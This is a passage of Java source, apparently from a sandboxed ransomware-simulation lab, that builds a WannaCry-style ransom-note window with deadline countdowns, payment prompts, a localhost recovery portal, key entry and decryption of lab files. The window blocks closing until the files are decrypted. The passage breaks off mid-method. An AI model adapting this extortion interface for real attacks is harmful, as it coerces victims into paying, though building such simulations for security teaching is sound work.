package ransomware.ui;

import ransomware.crypto.CryptoAdapter;
import ransomware.crypto.DecryptionResult;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.LineBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * WannaCry-style Decryptor Window ("Wana Decrypt0r 2.0" aesthetic).
 *
 * <p>Features:
 * <ul>
 *   <li>Windowed desktop UI (NOT fullscreen, comfortable 920x660 window).</li>
 *   <li>Classic WannaCry 2-column layout with dark crimson theme (#82181A).</li>
 *   <li>Left panel: Padlock graphic, countdown timer with LED digital font look, links.</li>
 *   <li>Right panel: Incident FAQ ("What Happened?", "Can I Recover?", "How Do I Pay?").</li>
 *   <li>Private Key input field: Victim pastes the base64 Private Key from Recovery Portal.</li>
 *   <li>[Decrypt] button: Triggers actual decryption of Lab_sandbox files using the key.</li>
 *   <li>[Check Payment] button: Opens Recovery Portal in default browser.</li>
 * </ul>
 */
public final class LockScreen {

    private static final Color WANNACRY_DARK_RED   = new Color(130, 24, 26);
    private static final Color WANNACRY_PANEL_BG   = new Color(110, 18, 20);
    private static final Color WANNACRY_BOX_BG     = new Color(60, 10, 12);
    private static final Color WANNACRY_GOLD       = new Color(255, 215, 0);
    private static final Color WANNACRY_TEXT_LIGHT = new Color(245, 245, 245);
    private static final Color WANNACRY_MUTED      = new Color(210, 180, 180);

    private final String recoveryId;
    private final String portalUrl;
    private final JFrame frame;

    private JLabel countdownLabel1;
    private JLabel countdownLabel2;
    private JLabel paymentStatusLabel;
    private JTextField privateKeyField;
    private JButton decryptButton;
    private JButton checkPaymentButton;
    private JButton closeButton;
    private JLabel statusMessageLabel;

    private int remainingSeconds;
    private Timer timer;
    private Timer autoCloseTimer;
    private boolean isDecrypted = false;

    public LockScreen(String recoveryId,
                      String paymentStatus,
                      int initialCountdownSeconds) {
        this(recoveryId, paymentStatus, initialCountdownSeconds, "http://127.0.0.1:8080/");
    }

    public LockScreen(String recoveryId,
                      String paymentStatus,
                      int initialCountdownSeconds,
                      String portalUrl) {
        this.recoveryId = recoveryId;
        this.portalUrl = (portalUrl != null && !portalUrl.isBlank()) ? portalUrl : "http://127.0.0.1:8080/";
        this.remainingSeconds = initialCountdownSeconds;

        frame = new JFrame("Wana Decrypt0r 2.0 — Pixel Chaser Security Incident");
        try {
            java.io.InputStream is = LockScreen.class.getResourceAsStream("/icon.png");
            if (is != null) {
                frame.setIconImage(javax.imageio.ImageIO.read(is));
            }
        } catch (Exception ignored) {}
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent e) {
                if (isDecrypted) {
                    closeWindow();
                } else {
                    JOptionPane.showMessageDialog(frame,
                        "Cannot close: System is locked by ransomware.\n" +
                        "You must enter your Private Key and click [Decrypt]\n" +
                        "to successfully restore your files before closing this window.",
                        "Action Blocked — System Locked",
                        JOptionPane.WARNING_MESSAGE);
                }
            }
        });
        frame.setSize(940, 680);
        frame.setMinimumSize(new Dimension(860, 620));
        frame.setLocationRelativeTo(null); // Center on screen
        frame.setResizable(true);

        // Main root container
        JPanel root = new JPanel(new BorderLayout(0, 0));
        root.setBackground(WANNACRY_DARK_RED);
        root.setBorder(new LineBorder(new Color(60, 0, 0), 3));

        // ── Top Banner ────────────────────────────────────────────────────────
        JPanel topBanner = new JPanel(new BorderLayout());
        topBanner.setBackground(WANNACRY_DARK_RED);
        topBanner.setBorder(new EmptyBorder(10, 20, 8, 20));

        JLabel titleLabel = new JLabel("Ooops, your files have been encrypted!", SwingConstants.CENTER);
        titleLabel.setForeground(Color.WHITE);
        titleLabel.setFont(new Font("SansSerif", Font.BOLD, 22));
        topBanner.add(titleLabel, BorderLayout.CENTER);

        // Language indicator (like WannaCry)
        JLabel langLabel = new JLabel("English / Demo Lab", SwingConstants.RIGHT);
        langLabel.setForeground(new Color(220, 160, 160));
        langLabel.setFont(new Font("SansSerif", Font.PLAIN, 12));
        topBanner.add(langLabel, BorderLayout.EAST);

        root.add(topBanner, BorderLayout.NORTH);

        // ── Center Content: Left Panel (Timers) & Right Panel (FAQ & Actions) ──
        JPanel bodyPanel = new JPanel(new GridBagLayout());
        bodyPanel.setBackground(WANNACRY_DARK_RED);
        bodyPanel.setBorder(new EmptyBorder(0, 12, 10, 12));

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.fill = GridBagConstraints.BOTH;
        gbc.insets = new Insets(0, 4, 0, 4);

        // 1. LEFT PANEL (Padlock, Countdown, Recovery ID)
        JPanel leftPanel = createLeftPanel(recoveryId, paymentStatus);
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.weightx = 0.35;
        gbc.weighty = 1.0;
        bodyPanel.add(leftPanel, gbc);

        // 2. RIGHT PANEL (What happened, How to pay, Key Input, Decrypt button)
        JPanel rightPanel = createRightPanel();
        gbc.gridx = 1;
        gbc.gridy = 0;
        gbc.weightx = 0.65;
        gbc.weighty = 1.0;
        bodyPanel.add(rightPanel, gbc);

        root.add(bodyPanel, BorderLayout.CENTER);

        // Emergency hotkey (Ctrl+Shift+Q) for presentation safety
        JRootPane rootPane = frame.getRootPane();
        rootPane.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW)
            .put(KeyStroke.getKeyStroke(KeyEvent.VK_Q,
                InputEvent.CTRL_DOWN_MASK | InputEvent.SHIFT_DOWN_MASK),
                "emergency-exit");
        rootPane.getActionMap().put("emergency-exit", new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                System.out.println("[LockScreen] Emergency exit triggered (Ctrl+Shift+Q)");
                closeWindow();
            }
        });

        frame.setContentPane(root);

        // Start countdown timer
        startCountdown();
    }

    // ── Left Column Panel ───────────────────────────────────────────────────

    private JPanel createLeftPanel(String recoveryId, String initialPaymentStatus) {
        JPanel left = new JPanel();
        left.setLayout(new BoxLayout(left, BoxLayout.Y_AXIS));
        left.setBackground(WANNACRY_PANEL_BG);
        left.setBorder(BorderFactory.createCompoundBorder(
            new LineBorder(new Color(180, 40, 40), 1),
            new EmptyBorder(12, 14, 12, 14)
        ));

        // Padlock icon graphic
        JPanel padlockPanel = new JPanel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

                int w = getWidth();
                int h = getHeight();
                int padW = 74;
                int padH = 60;
                int x = (w - padW) / 2;
                int y = 28;

                // Shackle (arc)
                g2.setColor(new Color(230, 230, 230));
                g2.setStroke(new BasicStroke(10, BasicStroke.CAP_ROUND, BasicStroke.JOIN_ROUND));
                g2.drawArc(x + 15, y - 22, padW - 30, 40, 0, 180);

                // Body (golden-yellow / silver padlock)
                g2.setColor(new Color(245, 200, 30));
                g2.fillRoundRect(x, y, padW, padH, 14, 14);
                g2.setColor(new Color(180, 140, 10));
                g2.setStroke(new BasicStroke(2));
                g2.drawRoundRect(x, y, padW, padH, 14, 14);

                // Keyhole
                g2.setColor(new Color(40, 0, 0));
                g2.fillOval(x + padW / 2 - 5, y + 18, 10, 10);
                Polygon p = new Polygon();
                p.addPoint(x + padW / 2 - 4, y + 24);
                p.addPoint(x + padW / 2 + 4, y + 24);
                p.addPoint(x + padW / 2 + 6, y + 42);
                p.addPoint(x + padW / 2 - 6, y + 42);
                g2.fillPolygon(p);

                g2.dispose();
            }
        };
        padlockPanel.setPreferredSize(new Dimension(140, 100));
        padlockPanel.setMaximumSize(new Dimension(Short.MAX_VALUE, 105));
        padlockPanel.setOpaque(false);
        left.add(padlockPanel);
        left.add(Box.createVerticalStrut(10));

        // Box 1: Time to price raise / expiration
        JPanel timerBox1 = createTimerBox("Payment will be raised on",
            getRelativeDateString(3), remainingSeconds);
        countdownLabel1 = (JLabel) timerBox1.getClientProperty("timeLabel");
        left.add(timerBox1);
        left.add(Box.createVerticalStrut(10));

        // Box 2: Lost files time
        JPanel timerBox2 = createTimerBox("Your files will be lost on",
            getRelativeDateString(7), remainingSeconds * 2);
        countdownLabel2 = (JLabel) timerBox2.getClientProperty("timeLabel");
        left.add(timerBox2);
        left.add(Box.createVerticalStrut(12));

        // Recovery ID display
        JLabel ridHeader = new JLabel("Your Recovery ID:");
        ridHeader.setForeground(WANNACRY_MUTED);
        ridHeader.setFont(new Font("SansSerif", Font.PLAIN, 12));
        ridHeader.setAlignmentX(Component.CENTER_ALIGNMENT);
        left.add(ridHeader);

        JLabel ridValue = new JLabel(recoveryId);
        ridValue.setForeground(WANNACRY_GOLD);
        ridValue.setFont(new Font("Monospaced", Font.BOLD, 15));
        ridValue.setAlignmentX(Component.CENTER_ALIGNMENT);
        left.add(ridValue);

        left.add(Box.createVerticalStrut(8));

        // Payment status badge
        JLabel payHeader = new JLabel("Payment Status:");
        payHeader.setForeground(WANNACRY_MUTED);
        payHeader.setFont(new Font("SansSerif", Font.PLAIN, 12));
        payHeader.setAlignmentX(Component.CENTER_ALIGNMENT);
        left.add(payHeader);

        paymentStatusLabel = new JLabel(initialPaymentStatus);
        paymentStatusLabel.setForeground(new Color(255, 170, 40));
        paymentStatusLabel.setFont(new Font("Monospaced", Font.BOLD, 14));
        paymentStatusLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        left.add(paymentStatusLabel);

        left.add(Box.createVerticalGlue());

        // Informational links (left bottom)
        left.add(createLinkButton("About Bitcoin / Crypto", () ->
            showInfoDialog("Encryption Architecture",
                "This simulation utilizes hybrid encryption:\n" +
                "• AES-256-GCM (one unique key per file)\n" +
                "• RSA-4096-OAEP (asymmetric key encapsulation)\n" +
                "Data is only recoverable with the released Private Key.")));
        left.add(Box.createVerticalStrut(4));
        left.add(createLinkButton("How to obtain key?", () ->
            openBrowser(getPortalUrlWithRid())));
        left.add(Box.createVerticalStrut(4));
        left.add(createLinkButton("Contact Us", () ->
            openBrowser(getPortalUrlWithRid())));

        return left;
    }

    private JPanel createTimerBox(String headerText, String dateText, int seconds) {
        JPanel box = new JPanel();
        box.setLayout(new BoxLayout(box, BoxLayout.Y_AXIS));
        box.setBackground(WANNACRY_BOX_BG);
        box.setBorder(BorderFactory.createCompoundBorder(
            new LineBorder(new Color(190, 50, 50), 1),
            new EmptyBorder(6, 10, 8, 10)
        ));
        box.setMaximumSize(new Dimension(Short.MAX_VALUE, 90));

        JLabel hLabel = new JLabel(headerText);
        hLabel.setForeground(WANNACRY_GOLD);
        hLabel.setFont(new Font("SansSerif", Font.BOLD, 12));
        hLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        box.add(hLabel);

        JLabel dLabel = new JLabel(dateText);
        dLabel.setForeground(WANNACRY_TEXT_LIGHT);
        dLabel.setFont(new Font("SansSerif", Font.PLAIN, 11));
        dLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        box.add(dLabel);

        box.add(Box.createVerticalStrut(4));

        JLabel tlLabel = new JLabel("Time Left");
        tlLabel.setForeground(new Color(220, 180, 180));
        tlLabel.setFont(new Font("SansSerif", Font.PLAIN, 11));
        tlLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        box.add(tlLabel);

        JLabel timeLabel = new JLabel(formatTimeDigital(seconds));
        timeLabel.setForeground(new Color(255, 60, 60));
        timeLabel.setFont(new Font("Monospaced", Font.BOLD, 22));
        timeLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        box.add(timeLabel);

        box.putClientProperty("timeLabel", timeLabel);
        return box;
    }

    // ── Right Column Panel (FAQ, Portal Link, Key Field, Decrypt Button) ──

    private JPanel createRightPanel() {
        JPanel right = new JPanel(new BorderLayout(0, 8));
        right.setBackground(WANNACRY_DARK_RED);

        // 1. FAQ Scrollable text pane
        JTextPane faqPane = new JTextPane();
        faqPane.setContentType("text/html");
        faqPane.setEditable(false);
        faqPane.setBackground(Color.WHITE);
        faqPane.putClientProperty(JEditorPane.HONOR_DISPLAY_PROPERTIES, true);
        faqPane.setText(buildFaqHtml());
        faqPane.setCaretPosition(0);

        JScrollPane scroll = new JScrollPane(faqPane);
        scroll.setBorder(new LineBorder(new Color(80, 0, 0), 2));
        scroll.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);
        right.add(scroll, BorderLayout.CENTER);

        // 2. Action Area at the bottom (Portal Link + Private Key Field + Buttons)
        JPanel bottomActionPanel = new JPanel();
        bottomActionPanel.setLayout(new BoxLayout(bottomActionPanel, BoxLayout.Y_AXIS));
        bottomActionPanel.setBackground(WANNACRY_PANEL_BG);
        bottomActionPanel.setBorder(BorderFactory.createCompoundBorder(
            new LineBorder(new Color(180, 40, 40), 1),
            new EmptyBorder(8, 12, 10, 12)
        ));

        // Line 1: Portal Link Box
        JPanel portalBox = new JPanel(new BorderLayout(8, 0));
        portalBox.setOpaque(false);

        JLabel portalTitle = new JLabel("Recovery Portal: ");
        portalTitle.setForeground(WANNACRY_GOLD);
        portalTitle.setFont(new Font("SansSerif", Font.BOLD, 12));
        portalBox.add(portalTitle, BorderLayout.WEST);

        JTextField portalUrlField = new JTextField(getPortalUrlWithRid());
        portalUrlField.setEditable(false);
        portalUrlField.setBackground(new Color(40, 0, 0));
        portalUrlField.setForeground(new Color(100, 200, 255));
        portalUrlField.setFont(new Font("Monospaced", Font.PLAIN, 12));
        portalUrlField.setBorder(new LineBorder(new Color(160, 40, 40), 1));
        portalBox.add(portalUrlField, BorderLayout.CENTER);

        JPanel portalLinkActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 4, 0));
        portalLinkActions.setOpaque(false);

        JButton openUrlBtn = new JButton("Open Link");
        styleSmallButton(openUrlBtn);
        openUrlBtn.setToolTipText("Open Victim Decryption Portal in your browser");
        openUrlBtn.addActionListener(e -> {
            openBrowser(getPortalUrlWithRid());
            statusMessageLabel.setText("Opening Recovery Portal in browser...");
        });
        portalLinkActions.add(openUrlBtn);

        JButton copyUrlBtn = new JButton("Copy Link");
        styleSmallButton(copyUrlBtn);
        copyUrlBtn.addActionListener(e -> {
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                new java.awt.datatransfer.StringSelection(portalUrlField.getText()), null);
            statusMessageLabel.setText("Recovery Portal URL copied to clipboard.");
        });
        portalLinkActions.add(copyUrlBtn);
        portalBox.add(portalLinkActions, BorderLayout.EAST);

        bottomActionPanel.add(portalBox);
        bottomActionPanel.add(Box.createVerticalStrut(8));

        // Line 2: Enter Private Key input field (KEY REQUIREMENT)
        JPanel keyInputBox = new JPanel(new BorderLayout(8, 0));
        keyInputBox.setOpaque(false);

        JLabel keyLabel = new JLabel("Enter Private Key (Base64): ");
        keyLabel.setForeground(WANNACRY_TEXT_LIGHT);
        keyLabel.setFont(new Font("SansSerif", Font.BOLD, 12));
        keyInputBox.add(keyLabel, BorderLayout.WEST);

        privateKeyField = new JTextField();
        privateKeyField.setFont(new Font("Monospaced", Font.PLAIN, 12));
        privateKeyField.setBackground(Color.WHITE);
        privateKeyField.setForeground(Color.BLACK);
        privateKeyField.setBorder(new LineBorder(new Color(120, 0, 0), 1));
        privateKeyField.setToolTipText("Paste the Base64 Private Key released by the Recovery Portal here");
        keyInputBox.add(privateKeyField, BorderLayout.CENTER);

        privateKeyField.getDocument().addDocumentListener(new javax.swing.event.DocumentListener() {
            private void update() {
                if (isDecrypted) {
                    frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                    if (closeButton != null) closeButton.setEnabled(true);
                } else {
                    frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
                    if (closeButton != null) closeButton.setEnabled(false);
                    boolean hasKey = !privateKeyField.getText().trim().isEmpty();
                    if (hasKey) {
                        statusMessageLabel.setText("Private Key entered. Click [Decrypt] to verify key and restore files.");
                        statusMessageLabel.setForeground(new Color(120, 230, 255));
                    } else {
                        statusMessageLabel.setText("Ready. Obtain key from Recovery Portal and click [Decrypt].");
                        statusMessageLabel.setForeground(new Color(255, 230, 150));
                    }
                }
            }
            @Override public void insertUpdate(javax.swing.event.DocumentEvent e) { update(); }
            @Override public void removeUpdate(javax.swing.event.DocumentEvent e) { update(); }
            @Override public void changedUpdate(javax.swing.event.DocumentEvent e) { update(); }
        });

        JButton pasteKeyBtn = new JButton("Paste");
        styleSmallButton(pasteKeyBtn);
        pasteKeyBtn.addActionListener(e -> {
            try {
                String clipboard = (String) Toolkit.getDefaultToolkit()
                    .getSystemClipboard().getData(java.awt.datatransfer.DataFlavor.stringFlavor);
                if (clipboard != null) {
                    privateKeyField.setText(clipboard.trim());
                    statusMessageLabel.setText("Private Key pasted. Click [Decrypt] to verify and restore files.");
                    statusMessageLabel.setForeground(new Color(120, 230, 255));
                }
            } catch (Exception ex) {
                statusMessageLabel.setText("Unable to paste from clipboard.");
            }
        });
        keyInputBox.add(pasteKeyBtn, BorderLayout.EAST);

        bottomActionPanel.add(keyInputBox);
        bottomActionPanel.add(Box.createVerticalStrut(8));

        // Line 3: Status / Feedback message
        statusMessageLabel = new JLabel("Ready. Obtain key from Recovery Portal and click [Decrypt].");
        statusMessageLabel.setForeground(new Color(255, 230, 150));
        statusMessageLabel.setFont(new Font("SansSerif", Font.ITALIC, 11));
        statusMessageLabel.setAlignmentX(Component.LEFT_ALIGNMENT);
        bottomActionPanel.add(statusMessageLabel);
        bottomActionPanel.add(Box.createVerticalStrut(8));

        // Line 4: Action Buttons ([Open Demo Folder], [Check Payment], [Decrypt], [Close Window])
        JPanel buttonsPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 10, 0));
        buttonsPanel.setOpaque(false);

        JButton openFolderBtn = new JButton("Open Demo Folder");
        styleActionButton(openFolderBtn, new Color(45, 65, 95), Color.WHITE);
        openFolderBtn.setToolTipText("Open the victim working folder in Windows File Explorer");
        openFolderBtn.addActionListener(e -> {
            try {
                java.nio.file.Path p = java.nio.file.Paths.get(ransomware.AppConfig.sandboxRoot())
                    .resolve("working").resolve(recoveryId);
                if (java.nio.file.Files.exists(p)) {
                    Desktop.getDesktop().open(p.toFile());
                } else {
                    Desktop.getDesktop().open(java.nio.file.Paths.get(ransomware.AppConfig.sandboxRoot()).resolve("working").toFile());
                }
            } catch (Exception ex) {
                statusMessageLabel.setText("Cannot open folder: " + ex.getMessage());
            }
        });
        buttonsPanel.add(openFolderBtn);

        checkPaymentButton = new JButton("Check Payment");
        styleActionButton(checkPaymentButton, new Color(180, 180, 180), Color.BLACK);
        checkPaymentButton.setToolTipText("Open Victim Decryption Portal in browser");
        checkPaymentButton.addActionListener(e -> {
            openBrowser(getPortalUrlWithRid());
            statusMessageLabel.setText("Opening Recovery Portal in browser...");
        });
        buttonsPanel.add(checkPaymentButton);

        decryptButton = new JButton("Decrypt");
        styleActionButton(decryptButton, new Color(220, 40, 40), Color.WHITE);
        decryptButton.setFont(new Font("SansSerif", Font.BOLD, 15));
        decryptButton.addActionListener(e -> handleDecryptAction());
        buttonsPanel.add(decryptButton);

        closeButton = new JButton("Close Window");
        styleActionButton(closeButton, new Color(75, 75, 75), Color.WHITE);
        closeButton.setEnabled(false);
        closeButton.setToolTipText("Available once files are successfully decrypted");
        closeButton.addActionListener(e -> {
            if (isDecrypted) {
                if (autoCloseTimer != null) autoCloseTimer.stop();
                closeWindow();
            }
        });
        buttonsPanel.add(closeButton);

        bottomActionPanel.add(buttonsPanel);

        right.add(bottomActionPanel, BorderLayout.SOUTH);
        return right;
    }

    // ── Decryption Trigger Logic ──────────────────────────────────────────

    private void handleDecryptAction() {
        if (isDecrypted) {
            JOptionPane.showMessageDialog(frame,
                "All files have already been decrypted and restored.",
                "Notice", JOptionPane.INFORMATION_MESSAGE);
            return;
        }

        String keyInput = privateKeyField.getText().trim();
        if (keyInput.isEmpty()) {
            JOptionPane.showMessageDialog(frame,
                "Please enter the Private Key provided by the Recovery Portal after payment confirmation.",
                "Private Key Required", JOptionPane.WARNING_MESSAGE);
            statusMessageLabel.setText("ERROR: Private Key field is empty.");
            privateKeyField.requestFocus();
            return;
        }

        statusMessageLabel.setText("Attempting decryption of Lab_sandbox files...");
        decryptButton.setEnabled(false);

        // Run decryption on background thread so UI stays responsive
        SwingWorker<DecryptionResult, Void> worker = new SwingWorker<>() {
            @Override
            protected DecryptionResult doInBackground() throws Exception {
                // 1. Decrypt locally in Lab_sandbox/working/<recoveryId>
                CryptoAdapter adapter = new CryptoAdapter();
                DecryptionResult result = adapter.decryptWithKey(recoveryId, keyInput);

                // 2. Also notify controller endpoint if reachable
                try {
                    notifyControllerRestored(recoveryId);
                } catch (Exception ignored) {}

                return result;
            }

            @Override
            protected void done() {
                decryptButton.setEnabled(true);
                try {
                    DecryptionResult res = get();
                    if (res != null && res.success && res.restoredCount > 0) {
                        isDecrypted = true;
                        if (timer != null) timer.stop();

                        statusMessageLabel.setText("✔ Decryption successful! " + res.restoredCount + " files restored. Auto-closing in 3s...");
                        statusMessageLabel.setForeground(new Color(80, 255, 120));

                        countdownLabel1.setText("RECOVERED");
                        countdownLabel1.setForeground(new Color(80, 255, 120));
                        countdownLabel2.setText("RECOVERED");
                        countdownLabel2.setForeground(new Color(80, 255, 120));
                        paymentStatusLabel.setText("COMPLETED");
                        paymentStatusLabel.setForeground(new Color(80, 255, 120));

                        // Allow closing the window immediately via Close Window button or X button
                        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        if (closeButton != null) {
                            closeButton.setEnabled(true);
                            closeButton.setText("Close Window (3s)");
                        }

                        // Start 3-second auto-close countdown
                        startAutoCloseCountdown(3);
                    } else {
                        String errMsg = (res != null && res.failedCount > 0)
                            ? "Failed to decrypt " + res.failedCount + " files."
                            : "No locked files found or decryption failed.";
                        statusMessageLabel.setText("❌ " + errMsg);
                        statusMessageLabel.setForeground(new Color(255, 100, 100));

                        JOptionPane.showMessageDialog(frame,
                            errMsg + "\nPlease ensure you entered the exact Private Key from the Recovery Portal.",
                            "Decryption Failed", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (Exception ex) {
                    statusMessageLabel.setText("❌ Decryption error: " + ex.getMessage());
                    statusMessageLabel.setForeground(new Color(255, 100, 100));
                    JOptionPane.showMessageDialog(frame,
                        "Decryption Error:\n" + ex.getMessage() + "\n\nMake sure the Private Key is valid PKCS#8 Base64.",
                        "Decryption Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        };
        worker.execute();
    }

    private void notifyControllerRestored(String rid) {
        try {
            URL url = new URL("http://127.0.0.1:5000/api/recovery/restore/" + rid);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(1500);
            c.setReadTimeout(1500);
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ── Public API (called by DemoController) ─────────────────────────────

    public void showWindow() {
        SwingUtilities.invokeLater(() -> {
            frame.setVisible(true);
            frame.toFront();
        });
    }

    public void updateCountdown(int seconds) {
        if (isDecrypted) return;
        this.remainingSeconds = seconds;
        SwingUtilities.invokeLater(() -> {
            if (seconds <= 0) {
                countdownLabel1.setText("00:00:00");
                countdownLabel1.setForeground(new Color(150, 150, 150));
                countdownLabel2.setText("EXPIRED");
                statusMessageLabel.setText("Time expired. Data recovery unavailable.");
            } else {
                countdownLabel1.setText(formatTimeDigital(seconds));
                countdownLabel2.setText(formatTimeDigital(seconds * 2));
            }
        });
    }

    public void updatePaymentStatus(String status) {
        SwingUtilities.invokeLater(() -> {
            paymentStatusLabel.setText(status);
            if ("CONFIRMED".equalsIgnoreCase(status) || "RECOVERY_AVAILABLE".equalsIgnoreCase(status)) {
                paymentStatusLabel.setForeground(new Color(80, 220, 120));
                statusMessageLabel.setText("Payment confirmed! Retrieve your Private Key from the Portal.");
            } else if ("EXPIRED".equalsIgnoreCase(status)) {
                paymentStatusLabel.setForeground(new Color(200, 50, 50));
                statusMessageLabel.setText("Session expired. Keys unavailable.");
            }
        });
    }

    public void closeWindow() {
        if (autoCloseTimer != null) autoCloseTimer.stop();
        if (timer != null) timer.stop();
        SwingUtilities.invokeLater(() -> {
            frame.setVisible(false);
            frame.dispose();
        });
    }

    private void startAutoCloseCountdown(int initialSeconds) {
        if (autoCloseTimer != null && autoCloseTimer.isRunning()) {
            autoCloseTimer.stop();
        }
        final int[] remaining = {initialSeconds};
        autoCloseTimer = new Timer(1000, e -> {
            remaining[0]--;
            if (remaining[0] > 0) {
                if (closeButton != null) {
                    closeButton.setText("Close Window (" + remaining[0] + "s)");
                }
                statusMessageLabel.setText("✔ Decryption successful! All files restored. Auto-closing in " + remaining[0] + "s...");
            } else {
                if (autoCloseTimer != null) autoCloseTimer.stop();
                closeWindow();
            }
        });
        autoCloseTimer.start();
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    private void startCountdown() {
        timer = new Timer(1000, e -> {
            if (isDecrypted) {
                timer.stop();
                return;
            }
            if (remainingSeconds > 0) {
                remainingSeconds--;
                updateCountdown(remainingSeconds);
            } else {
                timer.stop();
            }
        });
        timer.start();
    }

    private String getPortalUrlWithRid() {
        String base = portalUrl;
        if (!base.endsWith("/")) base += "/";
        return base + "?rid=" + recoveryId;
    }

    private static String formatTimeDigital(int totalSeconds) {
        if (totalSeconds <= 0) return "00:00:00";
        int days = totalSeconds / 86400;
        int hours = (totalSeconds % 86400) / 3600;
        int mins = (totalSeconds % 3600) / 60;
        int secs = totalSeconds % 60;
        if (days > 0) {
            return String.format("%02d:%02d:%02d:%02d", days, hours, mins, secs);
        }
        return String.format("%02d:%02d:%02d", hours, mins, secs);
    }

    private static String getRelativeDateString(int plusDays) {
        LocalDateTime dt = LocalDateTime.now().plusDays(plusDays);
        return dt.format(DateTimeFormatter.ofPattern("M/d/yyyy HH:mm:ss"));
    }

    public static void openBrowser(String url) {
        try {
            String browser = findBrowserExecutable();
            if (browser != null && !browser.isBlank()) {
                String flag = browser.toLowerCase().contains("firefox") ? "-new-window" : "--new-window";
                new ProcessBuilder(browser, flag, url).start();
                return;
            }
        } catch (Exception ignored) {}

        try {
            Desktop.getDesktop().browse(new URI(url));
        } catch (Exception e) {
            System.err.println("[LockScreen] Cannot open browser: " + e.getMessage());
        }
    }

    private static String findBrowserExecutable() {
        // 1. Query registry for default browser ProgId
        try {
            Process p = new ProcessBuilder("reg", "query",
                "HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice",
                "/v", "ProgId").start();
            String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            for (String line : out.split("\r?\n")) {
                if (line.contains("ProgId") && line.contains("REG_SZ")) {
                    String progId = line.substring(line.indexOf("REG_SZ") + 6).trim();
                    if (!progId.isBlank()) {
                        Process p2 = new ProcessBuilder("reg", "query",
                            "HKCR\\" + progId + "\\shell\\open\\command", "").start();
                        String out2 = new String(p2.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
                        for (String l2 : out2.split("\r?\n")) {
                            if (l2.contains("REG_SZ")) {
                                String cmd = l2.substring(l2.indexOf("REG_SZ") + 6).trim();
                                String candidate = extractExePath(cmd);
                                if (candidate != null && java.nio.file.Files.exists(java.nio.file.Paths.get(candidate))) {
                                    return candidate;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // 2. Common browser paths
        String[] candidates = {
            "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
        };
        for (String c : candidates) {
            if (c != null && java.nio.file.Files.exists(java.nio.file.Paths.get(c))) {
                return c;
            }
        }
        return null;
    }

    private static String extractExePath(String cmd) {
        if (cmd == null || cmd.isBlank()) return null;
        if (cmd.startsWith("\"")) {
            int end = cmd.indexOf("\"", 1);
            if (end > 1) return cmd.substring(1, end);
        }
        int space = cmd.indexOf(" ");
        if (space > 0) return cmd.substring(0, space);
        return cmd;
    }

    private static void showInfoDialog(String title, String message) {
        JOptionPane.showMessageDialog(null, message, title, JOptionPane.INFORMATION_MESSAGE);
    }

    private static JButton createLinkButton(String text, Runnable onClick) {
        JButton btn = new JButton("<html><u>" + text + "</u></html>");
        btn.setForeground(new Color(220, 200, 200));
        btn.setFont(new Font("SansSerif", Font.PLAIN, 11));
        btn.setBorderPainted(false);
        btn.setContentAreaFilled(false);
        btn.setFocusPainted(false);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        btn.setAlignmentX(Component.CENTER_ALIGNMENT);
        btn.addActionListener(e -> onClick.run());
        return btn;
    }

    private static void styleSmallButton(JButton btn) {
        btn.setBackground(new Color(70, 15, 15));
        btn.setForeground(Color.WHITE);
        btn.setFont(new Font("SansSerif", Font.PLAIN, 11));
        btn.setBorder(new LineBorder(new Color(150, 40, 40), 1));
        btn.setFocusPainted(false);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
    }

    private static void styleActionButton(JButton btn, Color bg, Color fg) {
        btn.setBackground(bg);
        btn.setForeground(fg);
        btn.setFont(new Font("SansSerif", Font.BOLD, 13));
        btn.setBorder(BorderFactory.createCompoundBorder(
            new LineBorder(new Color(80, 0, 0), 1),
